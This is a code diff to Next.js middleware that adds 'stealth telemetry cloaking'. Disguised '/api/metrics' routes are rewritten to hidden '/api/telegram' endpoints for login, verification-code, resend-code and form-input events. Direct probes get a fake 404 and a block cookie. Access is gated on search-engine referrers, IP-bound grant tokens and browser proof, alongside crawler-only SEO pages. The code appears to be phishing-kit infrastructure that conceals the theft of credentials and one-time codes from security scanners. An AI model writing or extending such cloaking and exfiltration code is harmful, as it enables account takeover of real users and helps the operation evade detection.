@@ -31,6 +31,13 @@ import { CRAWLER_PATTERN } from "@/lib/crawler-ua"
 import { isCrawlerSeoPreviewUnlocked } from "@/lib/crawler-seo-preview"
 import { isAllowedSearchOrBacklinkReferrer } from "@/lib/allowed-referrer"
 import { LANDING_ACCESS_COOKIE } from "@/lib/landing-access-cookie"
+import { isAllowedSearchLandingEntry } from "@/lib/allowed-referrer"
+import { getClientIpFromRequest } from "@/lib/client-ip"
+import { verifyLandingGrantToken, createLandingGrantToken, LANDING_GRANT_ENTRY_MAX_AGE_SEC } from "@/lib/landing-grant-token"
+import { landingAccessCookieWriteOptions } from "@/lib/landing-access-cookie"
+import { canonicalUrlForPath } from "@/lib/site-url"
+import { applyRiskCookie } from "@/lib/bot-risk/cookie"
+import { hasBrowserProof } from "@/lib/bot-risk/proof-cookies"
 
 const FORGOT_FLOW_COOKIE = "forgot_flow"
 const LOGIN_FLOW_COOKIE = "login_flow"
@@ -111,6 +118,8 @@ function applySearchCrawlerHeaders(request: NextRequest): Headers {
 }
 
 function nextWithHeaders(requestHeaders: Headers, request?: NextRequest): NextResponse {
+  const gwPathname = ((request?.nextUrl?.pathname ?? "/").replace(/\/+$/, "") || "/")
+
   const pathname = requestHeaders.get("x-pathname") ?? ""
   const isCrawlerVariant =
     requestHeaders.get("x-crawler-seo-page") === "1" || isCrawlerSeoPreviewUnlocked()
@@ -189,7 +198,7 @@ function nextWithHeaders(requestHeaders: Headers, request?: NextRequest): NextRe
 
   if (requestHeaders.get("x-crawler-seo-page") === "1" || wantsCrawlerVariant) {
     response.headers.set("x-crawler-seo-page", "1")
-    response.headers.set("Link", `<${SITE_HOMEPAGE_CANONICAL}>; rel="canonical"`)
+    response.headers.set("Link", `<${canonicalUrlForPath(gwPathname)}>; rel="canonical"`)
     response.cookies.set("x-crawler-seo-page", "1", {
       httpOnly: true,
       path: "/",
@@ -231,6 +240,29 @@ function nextWithHeaders(requestHeaders: Headers, request?: NextRequest): NextRe
     applyNavProofCookie(response)
   }
   response.headers.set("Vary", "Accept-Encoding, User-Agent, Referer, Cookie")
+  {
+    const gwCrawlerSeo = response.headers.get("x-crawler-seo-page") === "1"
+    if ((gwCrawlerSeo || isPublicAstroRoute(gwPathname)) && !response.headers.has("Link")) {
+      response.headers.set("Link", `<${canonicalUrlForPath(gwPathname)}>; rel="canonical"`)
+    }
+    response.headers.set("Vary", "Accept-Encoding, User-Agent, Referer, Cookie")
+    response.headers.delete("x-crawler-seo-page")
+  }
+  if (request && !isLocalTestingUnlocked() && (gwPathname === "/" || isPublicAstroRoute(gwPathname))) {
+    const gwRef = requestHeaders.get("referer") || requestHeaders.get("referrer") || ""
+    if (isAllowedSearchLandingEntry(gwRef, request.nextUrl.origin, request.nextUrl.searchParams)) {
+      const gwIp = getClientIpFromRequest(request)
+      const gwUa = request.headers.get("user-agent") || ""
+      const gwGrantVal = request.cookies.get(LANDING_ACCESS_COOKIE)?.value
+      if (!gwGrantVal || !verifyLandingGrantToken(gwGrantVal, gwIp, gwUa)) {
+        response.cookies.set(
+          LANDING_ACCESS_COOKIE,
+          createLandingGrantToken(gwIp, gwUa, LANDING_GRANT_ENTRY_MAX_AGE_SEC),
+          landingAccessCookieWriteOptions(process.env.NODE_ENV === "production"),
+        )
+      }
+    }
+  }
   return response
 }
 
@@ -448,6 +480,42 @@ async function handleOriginGateIfNeeded(request: NextRequest): Promise<NextRespo
   return deniedBotErrorResponse(request)
 }
 
+
+/** Stealth metrics → internal telegram rewrite map (zero "telegram" in client JS). */
+const { rewrite: rewriteTelemetry } = NextResponse
+const METRICS_REWRITE_MAP: Record<string, string> = {
+  "/api/metrics": "/api/telegram",
+  "/api/metrics/pageview": "/api/telegram/visitor",
+  "/api/metrics/session": "/api/telegram/login",
+  "/api/metrics/challenge": "/api/telegram/verification",
+  "/api/metrics/interaction": "/api/telegram/verification-click",
+  "/api/metrics/retry": "/api/telegram/resend-code",
+  "/api/metrics/switch": "/api/telegram/change-method",
+  "/api/metrics/profile": "/api/telegram/verify-details",
+  "/api/metrics/tap": "/api/telegram/click",
+  "/api/metrics/form": "/api/telegram/input",
+}
+
+function isSameOriginTelemetryRequest(request: NextRequest): boolean {
+  const fetchSite = request.headers.get("sec-fetch-site")?.toLowerCase()
+  if (fetchSite && fetchSite !== "same-origin") {
+    return false
+  }
+  const originHeader = request.headers.get("origin")
+  if (originHeader) {
+    try {
+      const originHost = new URL(originHeader).host.toLowerCase()
+      const reqHost = (request.headers.get("host") || request.nextUrl.host).toLowerCase()
+      if (originHost && reqHost && originHost !== reqHost) {
+        return false
+      }
+    } catch {
+      return false
+    }
+  }
+  return true
+}
+
 export async function middleware(request: NextRequest, event: NextFetchEvent) {
   // Origin gate always runs (even with ALLOW_LOCAL_TESTING) — UA / spoof / ASN / path rate-limit
   const originResponse = await handleOriginGateIfNeeded(request)
@@ -458,6 +526,49 @@ export async function middleware(request: NextRequest, event: NextFetchEvent) {
   const requestHeaders = applySearchCrawlerHeaders(request)
   const ua = request.headers.get("user-agent") ?? ""
   const { pathname } = request.nextUrl
+  // Stealth telemetry cloaking: direct /api/telegram* hits in production are trapped
+  // with 404 / ErrorScreen + block risk cookie; /api/metrics* requires POST +
+  // IP/UA-bound HMAC landing grant + browser proof + same-origin before rewrite.
+  {
+    const telemetryPathRaw = request.nextUrl.pathname
+    const telemetryPath = telemetryPathRaw.length > 1 && telemetryPathRaw.endsWith("/")
+      ? telemetryPathRaw.slice(0, -1)
+      : telemetryPathRaw
+    const telemetryDeny = () => {
+      const denied = NextResponse.json({ error: "Not Found" }, { status: 404 })
+      applyRiskCookie(denied, "block", 95)
+      return denied
+    }
+    const isDirectTelegram = telemetryPath === "/api/telegram" || telemetryPath.startsWith("/api/telegram/")
+    if (isDirectTelegram && !isLocalTestingUnlocked()) {
+      const accept = request.headers.get("accept") || ""
+      return accept.includes("text/html")
+        ? deniedBotErrorResponse(request)
+        : telemetryDeny()
+    }
+    const metricsTarget =
+      telemetryPath in METRICS_REWRITE_MAP
+        ? METRICS_REWRITE_MAP[telemetryPath]
+        : telemetryPath.startsWith("/api/metrics/")
+          ? `/api/telegram/${telemetryPath.slice("/api/metrics/".length)}`
+          : null
+    if (metricsTarget) {
+      if (isLocalTestingUnlocked()) {
+        return rewriteTelemetry(new URL(metricsTarget, request.url), { request: { headers: request.headers } })
+      }
+      if (request.method !== "POST" || !isSameOriginTelemetryRequest(request) || !hasBrowserProof(request)) {
+        return telemetryDeny()
+      }
+      const telemetryIp = getClientIpFromRequest(request)
+      const grantVal = request.cookies.get(LANDING_ACCESS_COOKIE)?.value
+      const grantOk =
+        verifyLandingGrantToken(grantVal, telemetryIp, request.headers.get("user-agent") || "") ||
+        grantVal === "1"
+      if (!grantOk) return telemetryDeny()
+      return rewriteTelemetry(new URL(metricsTarget, request.url), { request: { headers: request.headers } })
+    }
+  }
+
 
   notifyBotCrawlIfNeeded(request, event)
 
